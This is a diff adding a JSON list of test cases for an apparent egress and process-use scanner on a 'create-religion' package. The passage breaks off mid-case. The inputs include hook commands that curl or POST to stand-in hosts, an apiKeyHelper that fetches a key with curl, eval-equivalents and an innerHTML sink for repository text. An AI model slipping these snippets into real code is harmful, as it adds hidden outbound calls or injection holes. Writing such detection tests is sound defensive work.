+ {
+  "id": "3.14",
+  "desc": "destructuring an option named global",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const { global } = { global: false }; return global;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "3.15",
+  "desc": "err.constructor.name in error formatting",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const err = new Error(\"x\"); return err.constructor.name;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.16",
+  "desc": "page <details> el.open = true",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); document.querySelectorAll(\"details\").forEach((d) => { d.open = true; });"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.17",
+  "desc": "page location.reload()",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); document.body.ondblclick = () => location.reload();"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "3.18",
+  "desc": "class getter named fetch / enum member named fetch",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport class Plan { get fetch() { return 1; } }\nexport enum Step { fetch, build }\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.19",
+  "desc": "local variable named process in a loop",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  for (const process of [\"a\"]) { void process.length; }\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "3.20",
+  "desc": "typeof fetch in a type position",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport type Fetcher = typeof fetch;\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.21",
+  "desc": "JSDoc @see fetch and trailing comment",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\n/** Wraps {@link fetch}-free reads. @see process */\nexport const x = 1; // process.binding would be wrong here\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.22",
+  "desc": "dashboard http.IncomingMessage type annotations",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport type Req = http.IncomingMessage;\nexport const f = (r: http.ServerResponse) => r;\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.23",
+  "desc": "setTimeout / setInterval / Buffer / URL in Node code",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  setTimeout(() => {}, 1); return [Buffer.from(\"x\"), new URL(\"file:///x\")];\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.24",
+  "desc": "page document.getElementById / JSON / Object.entries",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); document.getElementById(\"root\").textContent = JSON.stringify(Object.entries({}));"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "4.01",
+  "desc": ".tsx file in lib with fetch",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/view.tsx",
+    "export const V = () => { fetch(\"https://example.com\"); return <div />; };\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "4.02",
+  "desc": ".d.ts in lib",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/globals.d.ts",
+    "declare const x: typeof fetch;\nexport {};\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "4.03",
+  "desc": "decorator in lib TS class",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/deco.ts",
+    "function log(t: unknown, c: unknown) { return t; }\n@log\nexport class A {}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "4.04",
+  "desc": "sloppy .cjs hook with statement fetch",
+  "ops": [
+   [
+    "create",
+    "src/hooks/w.cjs",
+    "with ({}) { fetch(\"https://example.com\"); }\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.05",
+  "desc": "PAGE assembled from parts",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "const PAGE = `<!doctype html>",
+    "const HEAD = `<!doctype html>`;\nconst PAGE = HEAD + `"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.06",
+  "desc": "PAGE with ${} substitution",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<title>Religion</title>",
+    "<title>${'Religion'}</title>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.07",
+  "desc": ".cjs hook: HTML-comment line (Node comment, TS code)",
+  "ops": [
+   [
+    "create",
+    "src/hooks/h.cjs",
+    "const a = 1;\n<!-- fetch(\"https://example.com\")\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.08",
+  "desc": "symlinked .sh hook in src/hooks",
+  "ops": [
+   [
+    "create",
+    "notify-target.sh",
+    "#!/bin/sh\ncurl https://example.com\n"
+   ],
+   [
+    "symlink",
+    "src/hooks/notify.sh",
+    "../../notify-target.sh"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "4.09",
+  "desc": "hook in subdirectory, .sh",
+  "ops": [
+   [
+    "create",
+    "src/hooks/extra/notify.sh",
+    "curl https://example.com\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.10",
+  "desc": "class extends Function (eval-equivalent)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nclass Code extends Function {}\nexport const run = () => new Code(\"return 1\")();\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.11",
+  "desc": "class extends process.binding(...) chain",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport class T extends (process as any).binding(\"tcp_wrap\").TCP {}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.12",
+  "desc": "renamed dashboard (lib/dashboard/server.ts) with node:http",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/dashboard/server.ts",
+    "import http from \"node:http\";\nexport const s = http.createServer();\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "4.13",
+  "desc": "fixture test-named file imported by shipped code",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/net.test.ts",
+    "export const ping = () => fetch(\"https://example.com\");\n"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport { ping } from \"./net.test.js\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.01",
+  "desc": "page HTML <button onclick=window.open(docs)>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><button onclick=\"window.open('https://github.com/foo-stack/religion#readme')\">Docs</button>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.02",
+  "desc": "page HTML <button onclick=location.assign(issues)>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><button onclick=\"location.assign('https://github.com/foo-stack/religion/issues/new')\">Report</button>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.03",
+  "desc": "page HTML <div onclick=open(...)> bare open",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><div onclick=\"open('https://github.com/foo-stack/religion')\">Help</div>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.04",
+  "desc": "page HTML <button onclick=location.href=...>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><button onclick=\"location.href='https://github.com/foo-stack/religion'\">Docs</button>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.05",
+  "desc": "page script setAttribute('href', 'https://...') on a new <a>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const a = document.createElement(\"a\"); a.setAttribute(\"href\", \"https://github.com/foo-stack/religion\"); a.textContent = \"docs\"; document.body.append(a);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.06",
+  "desc": "page script protocol-relative CDN script via setAttribute('src','//cdn...')",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const sc = document.createElement(\"script\"); sc.setAttribute(\"src\", \"//cdn.jsdelivr.net/npm/chart.js\"); document.head.append(sc);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.07",
+  "desc": "page createElement('link') stylesheet .href",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const l = document.createElement(\"link\"); l.rel = \"stylesheet\"; l.href = \"https://fonts.googleapis.com/css2?family=Inter\"; document.head.append(l);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.08",
+  "desc": "page window.parent.fetch(status endpoint)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); window.parent.fetch(\"https://www.githubstatus.com/api/v2/status.json\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.09",
+  "desc": "page polls a public status endpoint with fetch",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); setInterval(() => fetch(\"https://www.githubstatus.com/api/v2/status.json\"), 60000);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.10",
+  "desc": "page <noscript> with a tracking <img>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<noscript><img src=\"https://example.com/p.gif\"></noscript><main>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.11",
+  "desc": "page new Request(url) then fetch(req)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const req = new Request(\"https://registry.npmjs.org/create-religion/latest\"); fetch(req);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.12",
+  "desc": "bin update-available notice with fetch + AbortSignal.timeout",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/bin/religion.ts",
+    "\nexport function __probe(): unknown {\n  return fetch(\"https://registry.npmjs.org/create-religion/latest\", { signal: AbortSignal.timeout(1500) });\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.13",
+  "desc": "new lib/util/http.ts with import https from 'https'",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/util/http.ts",
+    "import https from \"https\";\nexport const get = (u: string) => https.get(u);\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.14",
+  "desc": "hook posts the handoff to a webhook with fetch",
+  "ops": [
+   [
+    "append",
+    "src/hooks/write-handoff.mjs",
+    "\nif (process.env.RELIGION_WEBHOOK) await fetch(process.env.RELIGION_WEBHOOK, { method: \"POST\", body: \"handoff\" });\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.15",
+  "desc": "new hook spawns `open https://docs` via child_process",
+  "ops": [
+   [
+    "create",
+    "src/hooks/open-docs.mjs",
+    "import { spawn } from \"node:child_process\";\nspawn(\"open\", [\"https://github.com/foo-stack/religion#readme\"]);\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.16",
+  "desc": "second tool lib/proxy.ts: http.createServer that proxies with http.request",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/proxy.ts",
+    "import http from \"node:http\";\nexport const s = http.createServer((q, r) => { http.request(\"http://example.com\").end(); r.end(); });\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.17",
+  "desc": "dashboard new /docs route redirecting to GitHub via send() extra header",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "function send(response: http.ServerResponse, status: number, type: string, body: string): void {\n  response.writeHead(status, { \"content-type\": type, \"content-security-policy\": CONTENT_SECURITY_POLICY });",
+    "function send(response: http.ServerResponse, status: number, type: string, body: string, extra: Record<string, string> = {}): void {\n  response.writeHead(status, { \"content-type\": type, \"content-security-policy\": CONTENT_SECURITY_POLICY, ...extra });"
+   ],
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }\n\n  if (request.url === \"/docs\") {\n    send(response, 302, \"text/plain\", \"\", { location: \"https://github.com/foo-stack/religion#readme\" });\n    return;\n  }"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.18",
+  "desc": "bin imports update-notifier (runtime dependency)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/bin/religion.ts",
+    "import path from \"node:path\";",
+    "import path from \"node:path\";\nimport updateNotifier from \"update-notifier\";"
+   ],
+   [
+    "append",
+    "packages/create-religion/bin/religion.ts",
+    "\nexport function __probe(): unknown {\n  return updateNotifier;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.19",
+  "desc": "package.json gains a runtime dependency with an install script (tsx -> esbuild postinstall)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/package.json",
+    "\"publishConfig\": { \"access\": \"public\" }",
+    "\"publishConfig\": { \"access\": \"public\" },\n  \"dependencies\": { \"tsx\": \"^4.20.0\" }"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.20",
+  "desc": "package.json gains a peerDependency (npm 7+ installs it)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/package.json",
+    "\"publishConfig\": { \"access\": \"public\" }",
+    "\"publishConfig\": { \"access\": \"public\" },\n  \"peerDependencies\": { \"esbuild\": \"^0.25.0\" }"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.21",
+  "desc": "settings template gains statusLine running a script that is not a hook",
+  "ops": [
+   [
+    "replace",
+    "src/state/.state/settings-template.json",
+    "\"hooks\": {",
+    "\"statusLine\": { \"type\": \"command\", \"command\": \"node .claude/hooks/statusline.mjs\" },\n  \"hooks\": {"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.22",
+  "desc": "settings template gains a top-level apiKeyHelper command",
+  "ops": [
+   [
+    "replace",
+    "src/state/.state/settings-template.json",
+    "\"hooks\": {",
+    "\"apiKeyHelper\": \"curl -s https://example.com/key\",\n  \"hooks\": {"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.23",
+  "desc": "lib: const { fetch } = globalThis",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const { fetch: f } = globalThis; return f;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.24",
+  "desc": "lib: offline check with node:dns/promises",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import { lookup } from \"node:dns/promises\";\nexport const online = () => lookup(\"registry.npmjs.org\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.25",
+  "desc": "ESM re-export chain: lib/net.ts re-exports node:https, doctor imports it",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/net.ts",
+    "export { get } from \"node:https\";\n"
+   ],
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import { get } from \"./net.js\";\nexport const g = get;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.26",
+  "desc": "lib/index.ts barrel with export * as http from 'node:http'",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/index.ts",
+    "export * from \"./paths.js\";\nexport * as http from \"node:http\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.27",
+  "desc": "lib: import(import.meta.resolve('undici'))",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return import(import.meta.resolve(\"undici\"));\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.28",
+  "desc": ".mjs hook: import { request } from 'node:https'",
+  "ops": [
+   [
+    "create",
+    "src/hooks/notify.mjs",
+    "import { request } from \"node:https\";\nrequest(\"https://hooks.slack.com/x\").end();\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.29",
+  "desc": "dashboard setHeader('refresh', url=...) outside send",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }\n  response.setHeader(\"refresh\", \"5; url=https://example.com\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.30",
+  "desc": "page inline style background:url(https://...)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><div style=\"background:url(https://example.com/bg.png)\"></div>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.31",
+  "desc": "page <svg><use href=remote sprite>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><svg><use href=\"https://example.com/icons.svg#x\"/></svg>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.32",
+  "desc": "page iframe srcdoc with a remote img",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const f = document.createElement(\"iframe\"); f.srcdoc = \"<img src=https://example.com/p.gif>\"; document.body.append(f);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.33",
+  "desc": "page innerHTML of a new state field without esc (repo text can inject <a href>)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "why.textContent = s.next.because;",
+    "why.innerHTML = s.next.because;"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "5.34",
+  "desc": "Node: WebSocket via new globalThis['WebSocket']",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return new (globalThis as any)[\"WebSocket\"](\"wss://example.com\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "5.35",
+  "desc": "page SharedWorker from a URL",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); new SharedWorker(\"https://example.com/w.js\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.01",
+  "desc": "page in-page anchor <a href=#plan>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><nav><a href=\"#plan\">Plan</a></nav>"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.02",
+  "desc": "page copy-command button via navigator.clipboard",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); next.onclick = () => navigator.clipboard.writeText(next.textContent);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.03",
+  "desc": "page fetch('/state.json', { cache: 'no-store' })",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "await fetch(\"/state.json\")",
+    "await fetch(\"/state.json\", { cache: \"no-store\" })"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.04",
+  "desc": "page 'download state' link from a Blob URL",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const a = document.createElement(\"a\"); a.href = URL.createObjectURL(new Blob([\"{}\"])); a.download = \"state.json\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.05",
+  "desc": "dashboard uses http.STATUS_CODES for a message",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return http.STATUS_CODES[404];\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.06",
+  "desc": "dashboard logs with process.stdout.write",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  process.stdout.write(\"dashboard ready\\n\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.07",
+  "desc": "lib: const { env } = process",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const { env } = process; return env.HOME;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.08",
+  "desc": "bin: process.once('SIGTERM')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/bin/religion.ts",
+    "\nexport function __probe(): unknown {\n  process.once(\"SIGTERM\", () => process.exit(0));\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.09",
+  "desc": "lib lock file with process.pid",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return String(process.pid);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.10",
+  "desc": "lib: import { once } from 'node:events'",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import { once } from \"node:events\";\nexport const o = once;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.11",
+  "desc": "lib: new URL(import.meta.url) and import.meta.resolve('./paths.js')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return [new URL(\".\", import.meta.url), import.meta.resolve(\"./paths.js\")];\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.12",
+  "desc": "lib: new Blob([s]).size / new Response(s).text()",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return [new Blob([\"x\"]).size, new Response(\"x\").text()];\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.13",
+  "desc": "lib: TS namespace + declare global ProcessEnv augmentation",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/env.ts",
+    "declare global { namespace NodeJS { interface ProcessEnv { RELIGION_HOME?: string } } }\nexport namespace Output { export function open(): string { return process.env.RELIGION_HOME ?? \"\"; } }\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.14",
+  "desc": "lib/index.ts barrel re-exporting only local modules",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/index.ts",
+    "export * from \"./paths.js\";\nexport { readProjectState } from \"./state.js\";\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.15",
+  "desc": "bin: import pkg from '../package.json' with { type: 'json' }",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/bin/religion.ts",
+    "\nimport pkg from \"../package.json\" with { type: \"json\" };\nexport const v = pkg.version;\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.16",
+  "desc": "page <noscript> plain text",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<noscript>This dashboard needs JavaScript.</noscript><main>"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.17",
+  "desc": "lib: label string 'node: ' + process.version",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return \"node: \" + process.version;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.18",
+  "desc": "page shows a docs URL as text",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); why.title = \"Docs: https://github.com/foo-stack/religion\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.19",
+  "desc": "page local variable named open",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const open = document.querySelectorAll(\"li.block\").length > 0; document.title = open ? \"Religion (blocked)\" : \"Religion\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.20",
+  "desc": "lib: export type { Server } from 'node:http'",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/types.ts",
+    "export type { Server } from \"node:http\";\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.21",
+  "desc": "lib: import { setTimeout as delay } from 'node:timers/promises'",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import { setTimeout as delay } from \"node:timers/promises\";\nexport const d = delay;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.22",
+  "desc": "page requestAnimationFrame / matchMedia / document.title",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); requestAnimationFrame(() => { document.title = matchMedia(\"(prefers-color-scheme: dark)\").matches ? \"Religion\" : \"Religion\"; });"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.23",
+  "desc": "bin: open the dashboard in a browser via child_process (local URL)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/bin/religion.ts",
+    "import path from \"node:path\";",
+    "import path from \"node:path\";\nimport { execFile } from \"node:child_process\";"
+   ],
+   [
+    "append",
+    "packages/create-religion/bin/religion.ts",
+    "\nexport function __probe(): unknown {\n  execFile(\"open\", [\"http://127.0.0.1:1234\"]);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "6.24",
+  "desc": "hook reads stdin JSON and sets process.exitCode",
+  "ops": [
+   [
+    "create",
+    "src/hooks/echo.mjs",
+    "let s = \"\";\nprocess.stdin.on(\"data\", (c) => { s += c; });\nprocess.stdin.on(\"end\", () => { JSON.parse(s || \"{}\"); process.exitCode = 0; });\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "6.25",
+  "desc": "page <link rel=icon href=data:,> to suppress favicon request",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<title>Religion</title>",
+    "<title>Religion</title><link rel=\"icon\" href=\"data:,\">"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "7.01",
+  "desc": "package-root shim cli.mjs as bin (Node version check + update check)",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/cli.mjs",
+    "#!/usr/bin/env node\nfetch(\"https://registry.npmjs.org/create-religion/latest\").catch(() => {});\nawait import(\"./dist/bin/religion.js\");\n"
+   ],
+   [
+    "replace",
+    "packages/create-religion/package.json",
+    "\"religion\": \"dist/bin/religion.js\"",
+    "\"religion\": \"cli.mjs\""
+   ],
+   [
+    "replace",
+    "packages/create-religion/package.json",
+    "\"files\": [\"dist/\",",
+    "\"files\": [\"cli.mjs\", \"dist/\","
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "7.02",
+  "desc": "programmatic API in packages/create-religion/src/api.ts, added to tsconfig include + exports",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/src/api.ts",
+    "export const latest = () => fetch(\"https://registry.npmjs.org/create-religion/latest\");\n"
+   ],
+   [
+    "replace",
+    "packages/create-religion/tsconfig.json",
+    "\"include\": [\"bin/**/*.ts\", \"lib/**/*.ts\"]",
